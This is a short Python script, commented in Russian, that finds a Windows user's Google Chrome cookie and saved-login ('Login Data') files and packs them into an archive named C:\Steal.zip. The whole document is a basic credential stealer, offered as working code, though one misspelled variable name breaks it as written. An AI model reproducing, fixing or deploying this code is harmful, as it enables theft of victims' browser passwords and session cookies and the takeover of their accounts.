import os.path
 
import zipfile
 
from os import getlogin
 
 
 
 
 
user_name = getlogin() # Получаем имя пользователя
 
 
# Составляем полный путь для Google Chrome
 
GoogleChrome_Path = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies'
# Составляем полный путь Cookies файлов Google Chrome
 
GoogleChrome_Cookies = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
# Составляем полный путь файлов с паролями Google Chrome
 
GoogleChrome_Passwords = 'C:\\Users\\' + user_name + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
 
 
 
 
 
def main():
 
 if (os.path.exists(GoogleChrome_Path)): # Проверка наличия Куки Google Chrome
 
  zip_file = zipfile.ZipFile(r'C:\\Steal.zip', 'w') # Создаем новый C:\\Steal.zip
 
  zip_file.write(GoogleChrome_Coockies) # Помещаем куки файлы в архив
 
  zip_file.write(GoogleChrome_Passwords) # Помещаем пароли в архив
 
  zip_file.close() # Закрытие архива
 
 else:
 
  print('ERROR!') # Если Куки Google Chrome нет, то выводится "ERROR!"
 
 
 
 
# Запуск функции main()
 
if __name__ == '__main__':
 
 main()